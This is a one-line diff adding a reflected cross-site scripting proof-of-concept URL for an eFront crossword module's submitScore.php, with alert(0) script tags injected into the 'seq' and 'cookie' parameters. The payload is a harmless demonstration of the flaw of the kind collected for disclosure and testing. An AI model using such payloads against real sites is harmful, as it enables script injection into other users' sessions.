@@ -1,0 +1,1 @@
+http://www.example.com/efront/www/modules/module_crossword/app/submitScore.php?seq=&lt;script&gt;alert(0)&lt;/script&gt;&amp;cookie=&lt;script&gt;alert(0)&lt;/script&gt;
